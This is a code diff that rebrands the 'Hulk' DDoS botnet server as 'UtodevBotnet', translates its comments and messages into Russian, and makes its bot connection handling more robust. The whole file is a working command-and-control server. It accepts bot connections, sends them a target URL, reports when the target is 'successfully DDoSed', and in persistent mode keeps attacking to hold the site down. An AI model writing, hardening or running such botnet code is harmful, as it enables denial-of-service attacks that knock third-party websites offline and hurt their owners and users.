@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 
 """
-Hulk v3
+UtodevBotnet v3
 
-The Hulk server which is used to perform DDoS attacks via coordinated attacks.
-Hulk Clients/Bots can connect to the Hulk Server to receive the instructions.
+Сервер UtodevBotnet, который используется для выполнения DDoS-атак через скоординированные атаки.
+Клиенты/Боты UtodevBotnet могут подключаться к серверу UtodevBotnet для получения инструкций.
 """
 
 
@@ -38,17 +38,17 @@ except ImportError:  # When imported into launcher.
 
 
 # pylint: disable=too-many-instance-attributes, too-few-public-methods
-class HulkServer:
+class UtodevBotnetServer:
     """
-    The Hulk Server.
+    Сервер UtodevBotnet.
 
-    :param target: The target URL to attack.
+    :param target: URL цели для атаки.
     :type target: str
-    :param port: The port to connect to.
+    :param port: Порт для подключения.
     :type port: Optional[int]
-    :param persistent: Whether or not to keep attacking the target.
+    :param persistent: Продолжать ли атаковать цель.
     :type persistent: Optional[bool]
-    :param max_missiles: The maximum number of missiles to attack the target.
+    :param max_missiles: Максимальное количество ботов для атаки цели.
     :type max_missiles: Optional[int]
     """
     def __init__(
@@ -60,7 +60,7 @@ class HulkServer:
         if re.search(r'http[s]?\://([^/]*)/?.*', target):
             self.target = target
         else:
-            raise ValueError("Invalid URL.")
+            raise ValueError("Неверный URL.")
         self.port: int = port
         self.persistent: bool = persistent
         self.max_missiles: int = max_missiles
@@ -75,8 +75,8 @@ class HulkServer:
 
     def _get_socket(self) -> socket.socket:
         """
-        Creates a socket server and binds it to the port.
-        :return: The socket server.
+        Создает серверный сокет и привязывает его к порту.
+        :return: Серверный сокет.
         :rtype: socket.socket
         """
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,7 +87,7 @@ class HulkServer:
 
     def launch(self):
         """
-        Launches the Hulk Server.
+        Запускает сервер UtodevBotnet.
         """
         try:
             while self.inputs:
@@ -103,12 +103,12 @@ class HulkServer:
 
     def _get_new_target(self):
         """
-        Gets a new target from the user.
+        Получить новую цель от пользователя.
 
-        :return: The new target.
+        :return: Новая цель.
         :rtype: str
         """
-        target = input("Enter the next url (or 'quit' to exit):\n")
+        target = input("Введите следующий URL (или 'quit' для выхода):\n")
         if target.lower() in {
             "q", "quit", "exit"
         }:
@@ -122,8 +122,8 @@ class HulkServer:
 
     def _handle_readables(self, readable: List[socket.socket]):
         """
-        Handles the readable sockets.
-        :param readable: The list of readable sockets.
+        Обрабатывает читаемые сокеты.
+        :param readable: Список читаемых сокетов.
         :type readable: List[socket.socket]
         """
         for elem in readable:
@@ -132,32 +132,48 @@ class HulkServer:
             else:
                 try:
                     self._command(elem)
-                except Exception as exp:  # pylint: disable=broad-except
-                    if isinstance(exp, (ConnectionAbortedError, socket.error)):
-                        hostname, port = self.address_cache.pop(elem)
+                except (ConnectionAbortedError, ConnectionResetError, 
+                        socket.error, socket.timeout, OSError) as exp:
+                    hostname, port = self.address_cache.pop(elem, ("unknown", 0))
+                    if isinstance(exp, ConnectionAbortedError):
                         error_msg = str(ErrorMessages.CONNECTION_ABORTED)
-                        LOGGER.error(
-                            'Connection Error <%s> by [%s:%d]',
-                            error_msg, hostname, port
-                        )
+                    elif isinstance(exp, ConnectionResetError):
+                        error_msg = str(ErrorMessages.CONNECTION_RESET)
                     else:
-                        LOGGER.error(exp)
+                        error_msg = str(exp)
+                    LOGGER.error(
+                        'Ошибка соединения <%s> от [%s:%d]',
+                        error_msg, hostname, port
+                    )
                     if elem in self.outputs:
                         self.outputs.remove(elem)
-                    self.inputs.remove(elem)
+                    if elem in self.inputs:
+                        self.inputs.remove(elem)
+                    self.message_queues.pop(elem, None)
+                except Exception as exp:  # pylint: disable=broad-except
+                    # Логируем неожиданные ошибки
+                    hostname, port = self.address_cache.get(elem, ("unknown", 0))
+                    LOGGER.error(
+                        'Неожиданная ошибка <%s> от [%s:%d]: %s',
+                        type(exp).__name__, hostname, port, exp
+                    )
+                    if elem in self.outputs:
+                        self.outputs.remove(elem)
+                    if elem in self.inputs:
+                        self.inputs.remove(elem)
                     self.message_queues.pop(elem, None)
 
     def _accept_connections(self, server_elem: socket.socket):
         """
-        Accepts connections from the server.
-        :param server_elem: The server socket.
+        Принимает подключения от сервера.
+        :param server_elem: Серверный сокет.
         :type server_elem: socket.socket
         """
         connection, addr = server_elem.accept()
         ip_addr, port = addr
         hostname = socket.gethostbyaddr(ip_addr)[0]
         LOGGER.info(
-            "Established connection with Missile [%s:%d]",
+            "Установлено соединение с ботом [%s:%d]",
             hostname, port
         )
         connection.setblocking(0)
@@ -167,12 +183,32 @@ class HulkServer:
 
     def _command(self, bot: socket.socket):
         """
-        Command the connected bot.
+        Команда подключенному боту.
 
-        :param bot: The bot which connected to the server.
+        :param bot: Бот, который подключился к серверу.
         :type bot: socket.socket
         """
-        message = bot.recv(1024).decode()
+        bot.settimeout(5.0)  # Таймаут 5 секунд
+        try:
+            data = b''
+            while True:
+                chunk = bot.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+                if len(data) > 65536:  # Макс размер 64KB
+                    LOGGER.error("Сообщение от бота слишком большое. Закрытие соединения.")
+                    return
+                if b'\0' in chunk or len(chunk) < 4096:
+                    break
+            message = data.decode('utf-8', errors='ignore')
+        except socket.timeout:
+            LOGGER.warning("Таймаут при получении команды от бота.")
+            return
+        except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
+            LOGGER.error(f"Ошибка при получении команды: {e}")
+            raise
+        
         commands = self._client_pattern.findall(message)
         if not commands:
             return
@@ -186,13 +222,13 @@ class HulkServer:
             cmd.value
             for cmd in ClientCommands
         }:
-            msg_type = "Data"
+            msg_type = "Данные"
             data_name = str(ClientCommands(int(data)))
         else:
-            msg_type = "Status"
+            msg_type = "Статус"
             data_name = str(StatusCodes(int(data)))
         LOGGER.incoming(
-            "Received %s <%s> from [%s:%d]",
+            "Получено %s <%s> от [%s:%d]",
             msg_type, data_name, hostname, port
         )
         if (
@@ -213,7 +249,7 @@ class HulkServer:
             self._on_status_received(bot, data)
         elif int(data) == ClientCommands.KILLED:
             LOGGER.info(
-                "Disconnected from [%s:%d]",
+                "Отключено от [%s:%d]",
                 hostname, port
             )
             del self.message_queues[bot]
@@ -231,7 +267,7 @@ class HulkServer:
 
     def _fresh_start(self):
         """
-        Starts a new attack.
+        Начинает новую атаку.
         """
         self.target = self._get_new_target()
         for bot_ in self.on_standby:
@@ -247,38 +283,38 @@ class HulkServer:
 
     def _on_status_received(self, bot: socket.socket, data: str):
         """
-        Called when the status of the bot is received.
+        Вызывается при получении статуса бота.
 
-        :param bot: The bot which sent the status.
+        :param bot: Бот, который отправил статус.
         :type bot: socket.socket
-        :param data: The status message.
+        :param data: Сообщение статуса.
         :type data: str
         """
         status = int(data)
         if status >= StatusCodes.PWNED:
             self.completed = True
             LOGGER.success(
-                "Succesfully DDoSed %s", self.target
+                "Успешно выполнен DDoS на %s", self.target
             )
             if not self.persistent:
                 self._stop_all_bots()
             else:
-                # Keep attacking the target to keep it down.
+                # Продолжаем атаковать цель, чтобы держать её внизу.
                 self.message_queues[bot].put(str(ServerCommands.READ_TARGET))
                 self.message_queues[bot].put(self.target)
         elif status == StatusCodes.ANTI_DDOS:
             LOGGER.error(
-                "The entered URL has DDoS protection, please retry."
+                "Введенный URL защищен от DDoS, попробуйте снова."
             )
             self._stop_all_bots()
         elif status == StatusCodes.NOT_FOUND:
             LOGGER.error(
-                "The entered URL is invalid, please retry."
+                "Введенный URL неверен, попробуйте снова."
             )
             self._stop_all_bots()
         elif status in {StatusCodes.FORBIDDEN, StatusCodes.CONNECTION_FAILURE}:
             LOGGER.error(
-                "The entered URL is not accessible, please retry."
+                "Введенный URL недоступен, попробуйте снова."
             )
             self._stop_all_bots()
         else:
@@ -287,9 +323,9 @@ class HulkServer:
 
     def _stop_all_bots(self, terminate: bool = False):
         """
-        Stops all the bots and cleanup queues.
+        Останавливает всех ботов и очищает очереди.
 
-        :param terminate: Whether to terminate the bots.
+        :param terminate: Завершить ли ботов.
         :type terminate: bool
         """
         for bot, que in self.message_queues.items():
@@ -304,8 +340,8 @@ class HulkServer:
 
     def _handle_writables(self, writable: List[socket.socket]):
         """
-        Handles the writable sockets.
-        :param writable: The list of writable sockets.
+        Обрабатывает записываемые сокеты.
+        :param writable: Список записываемых сокетов.
         :type writable: List[socket.socket]
         """
         for elem in writable:
@@ -324,12 +360,12 @@ class HulkServer:
                 try:
                     elem.sendall(next_msg.encode())
                     msg_type = (
-                        "Target"
+                        "Цель"
                         if next_msg == self.target
-                        else "Command"
+                        else "Команда"
                     )
                     LOGGER.outgoing(
-                        "Sending %s <%s> to [%s:%d]",
+                        "Отправка %s <%s> на [%s:%d]",
                         msg_type, next_msg, hostname, port
                     )
                 except (
@@ -349,7 +385,7 @@ class HulkServer:
                     ):
                         error_msg = ErrorMessages.CONNECTION_ABORTED
                     LOGGER.error(
-                        'Connection Error <%s> by [%s:%d]',
+                        'Ошибка соединения <%s> от [%s:%d]',
                         error_msg, hostname, port
                     )
                     self.inputs.remove(elem)
@@ -357,15 +393,15 @@ class HulkServer:
                     self.outputs.remove(elem)
                 except Exception as exp:  # pylint: disable=broad-except
                     LOGGER.error(
-                        'Unknown Error %s by [%s:%d]',
+                        'Неизвестная ошибка %s от [%s:%d]',
                         exp, hostname, port
                     )
                     self.outputs.remove(elem)
 
     def _handle_exceptionals(self, exceptional: List[socket.socket]):
         """
-        Handles the exceptional sockets.
-        :param exceptional: The list of exceptional sockets.
+        Обрабатывает исключительные сокеты.
+        :param exceptional: Список исключительных сокетов.
         :type exceptional: List[socket.socket]
         """
         for elem in exceptional:
@@ -378,17 +414,17 @@ class HulkServer:
 
 def modify_parser(parser: argparse.ArgumentParser):
     """
-    Useful for exposing the parser modification to external modules.
+    Полезно для предоставления модификации парсера внешним модулям.
 
-    :param parser: The parser to modify.
+    :param parser: Парсер для модификации.
     :type parser: argparse.ArgumentParser
     """
     def valid_url(arg: argparse.Action):
         """
-        Checks if the URL is valid.
-        :param arg: The URL to check.
+        Проверяет, является ли URL действительным.
+        :param arg: URL для проверки.
         :type arg: argparse.Action
-        :return: The URL if valid, else None.
+        :return: URL, если действителен, иначе None.
         :rtype: argparse.Action
         """
         result = urlparse(arg)
@@ -397,43 +433,43 @@ def modify_parser(parser: argparse.ArgumentParser):
             result.path or result.netloc
         ]):
             raise argparse.ArgumentTypeError(
-                "The entered URL is invalid.\n"
-                "Valid Formats: https://www.example.com "
-                "or http://www.example.com"
+                "Введенный URL неверен.\n"
+                "Верные форматы: https://www.example.com "
+                "или http://www.example.com"
             )
         return arg
 
     parser.add_argument(
         "target",
-        help="The target url.",
+        help="URL цели.",
         type=valid_url
     )
     parser.add_argument(
         "-p", "--port",
-        help="The port to bind the server to.",
+        help="Порт для привязки сервера.",
         type=int,
         default=6666
     )
     parser.add_argument(
         "-m", '--max_missiles',
-        help="The maximum number of missiles to connect to.",
+        help="Максимальное количество ботов для подключения.",
         type=int,
         default=100
     )
     parser.add_argument(
         "--persistent",
-        help="Continue attacks after target is down.",
+        help="Продолжить атаки после падения цели.",
         action="store_false"
     )
     parser.add_argument(
         '--gui',
-        help="Run with GUI.",
+        help="Запустить с GUI.",
         action="store_true"
     )
 
 
 if __name__ == "__main__":
-    argparser = argparse.ArgumentParser(description="Hulk Server")
+    argparser = argparse.ArgumentParser(description="UtodevBotnet Server")
     modify_parser(argparser)
     args = argparser.parse_args()
 
@@ -444,8 +480,8 @@ if __name__ == "__main__":
             LOGGER.addHandler(UnixNamedPipeHandler(wait_for_pipe=True))
 
     # pylint: disable=duplicate-code
-    LOGGER.success("Hulk Server is Live!")
-    server = HulkServer(
+    LOGGER.success("Сервер UtodevBotnet запущен!")
+    server = UtodevBotnetServer(
         args.target, args.port,
         args.persistent,
         args.max_missiles
